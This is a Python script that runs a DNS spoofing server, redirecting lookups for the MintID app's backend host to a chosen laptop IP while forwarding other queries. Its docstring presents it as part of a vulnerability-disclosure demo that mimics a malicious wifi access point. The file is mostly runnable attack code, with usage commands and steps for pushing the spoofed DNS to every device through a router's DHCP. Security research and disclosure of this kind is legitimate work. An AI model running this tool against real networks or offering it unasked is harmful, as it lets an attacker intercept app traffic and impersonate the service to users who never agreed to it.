#!/usr/bin/env python3
"""
mintid_dns_spoof.py - tiny authoritative-looking DNS server that
intercepts queries for mintidapi.droisys.info and answers with a
configured IP (your laptop running mintid_fake_server.py), while
forwarding everything else to a real upstream resolver.

USE CASE
========
Lets you test the unmodified MintID app (or the patched one) against
your fake server WITHOUT modifying DNS on your phone manually. Point
the phone's wifi DNS to your laptop's IP, run this server, and only
the MintID-related hostnames get redirected.

This is an alternative to (or complement to) mintid_apk_repoint.py:

  Approach A: Patch the APK to bake in your server's IP. No DNS needed.
              Pros: works on any network. Cons: requires sideload/resign.

  Approach B: Run this DNS spoofer + fake server on your laptop, set
              the phone's DNS to your laptop's IP. Use the original,
              unmodified APK. Cons: requires control of the phone's
              DNS or the wifi router's DHCP.

Approach B is preferred for the disclosure demo because it shows the
attack working against a stock unmodified app -- no jailbreak, no
sideload, just network-level redirection on a captive wifi (which
matches the real-world threat of someone with a malicious wifi AP).

USAGE
=====

    # Spoof mintidapi.droisys.info -> 192.168.1.42
    sudo python3 mintid_dns_spoof.py --target-ip 192.168.1.42

    # Spoof multiple hostnames at once:
    sudo python3 mintid_dns_spoof.py --target-ip 192.168.1.42 \\
        --spoof mintidapi.droisys.info \\
        --spoof api.mintid.com

    # Bind to non-standard port (no sudo needed):
    python3 mintid_dns_spoof.py --target-ip 192.168.1.42 --port 5353

    # Custom upstream resolver (default 1.1.1.1):
    sudo python3 mintid_dns_spoof.py --target-ip 192.168.1.42 \\
        --upstream 8.8.8.8

CLIENT SETUP
============
On your phone (or test device), set DNS to your laptop's LAN IP:

  iOS:     Settings -> Wi-Fi -> [your network] info icon -> Configure
           DNS -> Manual -> add the laptop's IP
  Android: Wi-Fi -> long-press network -> Modify network ->
           Advanced -> IP settings: Static -> set DNS 1 to laptop IP

Or, if you control the wifi router, set the router's DHCP to advertise
the laptop's IP as the network's DNS server (then every device on the
network gets it automatically).

VERIFY
======

    # On a phone connected to the spoofing DNS:
    nslookup mintidapi.droisys.info     # -> should return target-ip
    nslookup google.com                  # -> should return real Google IP

REQUIREMENTS
  pip install dnslib

The default port 53 requires sudo on macOS/Linux. Use --port 5353 to
avoid sudo for testing on a single device (you'll need to set the
phone's DNS port too, which most clients don't support, so port 53 is
usually what you want).
"""
import argparse
import socket
import struct
import sys
import threading
import time

try:
    from dnslib import DNSRecord, DNSHeader, RR, A, QTYPE, RCODE
    from dnslib.server import DNSServer, BaseResolver
except ImportError:
    print("[fail] dnslib not installed.")
    print("       Install with:  pip install dnslib")
    sys.exit(1)


class SpoofingResolver(BaseResolver):
    """Resolver that returns target_ip for hostnames matching spoof_set,
    forwards everything else to the upstream resolver."""

    def __init__(self, spoof_set, target_ip, upstream, ttl=60, verbose=False):
        # Store hostnames lowercased, with and without trailing dot for
        # easier matching
        self.spoof_set = set()
        for h in spoof_set:
            h = h.lower().rstrip(".")
            self.spoof_set.add(h)
            self.spoof_set.add(h + ".")
        self.target_ip = target_ip
        self.upstream = upstream
        self.ttl = ttl
        self.verbose = verbose

    def resolve(self, request, handler):
        qname = str(request.q.qname).lower()
        qtype = QTYPE[request.q.qtype]

        # Check if the query matches a spoofed hostname (or subdomain of one)
        spoofed = False
        for needle in self.spoof_set:
            if qname == needle or qname == needle + "." or qname.endswith("." + needle):
                spoofed = True
                break

        reply = request.reply()
        if spoofed and qtype in ("A", "ANY"):
            print("[dns-spoof] %s %s -> %s (SPOOFED)" % (
                qtype, qname, self.target_ip,
            ))
            reply.add_answer(RR(
                rname=request.q.qname,
                rtype=QTYPE.A,
                rclass=1,
                ttl=self.ttl,
                rdata=A(self.target_ip),
            ))
            return reply

        if spoofed and qtype == "AAAA":
            # Refuse IPv6 queries for spoofed hostnames so the client
            # falls back to the spoofed A record.
            if self.verbose:
                print("[dns-spoof] AAAA %s -> empty (force IPv4 fallback)"
                       % qname)
            return reply  # empty response, NOERROR

        # Forward everything else upstream
        if self.verbose:
            print("[dns-forward] %s %s" % (qtype, qname))
        try:
            upstream_response = DNSRecord.parse(
                request.send(self.upstream, 53, timeout=5)
            )
            return upstream_response
        except Exception as exc:
            print("[dns-forward] upstream %s failed: %s" % (self.upstream, exc))
            reply.header.rcode = RCODE.SERVFAIL
            return reply


def main():
    p = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--target-ip", required=True,
                   help="IP that spoofed hostnames resolve to (your laptop's "
                        "LAN address, e.g. 192.168.1.42).")
    p.add_argument("--spoof", action="append", default=[],
                   help="Hostname to spoof. Can be repeated. Defaults to "
                        "mintidapi.droisys.info if not specified.")
    p.add_argument("--upstream", default="1.1.1.1",
                   help="Upstream DNS resolver for non-spoofed queries "
                        "(default: 1.1.1.1).")
    p.add_argument("--port", type=int, default=53,
                   help="UDP/TCP port to bind (default: 53, requires sudo).")
    p.add_argument("--bind", default="0.0.0.0",
                   help="Bind address (default: 0.0.0.0, all interfaces).")
    p.add_argument("--ttl", type=int, default=60,
                   help="TTL for spoofed records (default: 60).")
    p.add_argument("-v", "--verbose", action="store_true",
                   help="Log every query, not just spoofed ones.")
    args = p.parse_args()

    if not args.spoof:
        args.spoof = ["mintidapi.droisys.info"]

    print("=" * 60)
    print("MintID DNS spoofer")
    print("=" * 60)
    print("Bind            : %s:%d" % (args.bind, args.port))
    print("Spoofed hosts   : %s" % ", ".join(args.spoof))
    print("Spoofed -> IP   : %s" % args.target_ip)
    print("Upstream resolv : %s" % args.upstream)
    print("=" * 60)
    print("")
    print("On the test device, set wifi DNS to this machine's LAN IP.")
    print("To verify from another machine on the network:")
    for h in args.spoof:
        print("  nslookup %s <this-machine-ip>" % h)
    print("")

    resolver = SpoofingResolver(
        spoof_set=args.spoof,
        target_ip=args.target_ip,
        upstream=args.upstream,
        ttl=args.ttl,
        verbose=args.verbose,
    )

    udp_server = DNSServer(
        resolver, address=args.bind, port=args.port, tcp=False,
    )
    tcp_server = DNSServer(
        resolver, address=args.bind, port=args.port, tcp=True,
    )

    try:
        udp_server.start_thread()
        tcp_server.start_thread()
        print("[dns] Listening (UDP+TCP). Ctrl-C to stop.")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[dns] Shutting down.")
        udp_server.stop()
        tcp_server.stop()
    except PermissionError:
        print("[fail] Permission denied binding to port %d." % args.port)
        print("       Either re-run with sudo, or use --port 5353 (or any "
              "port >= 1024).")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main() or 0)
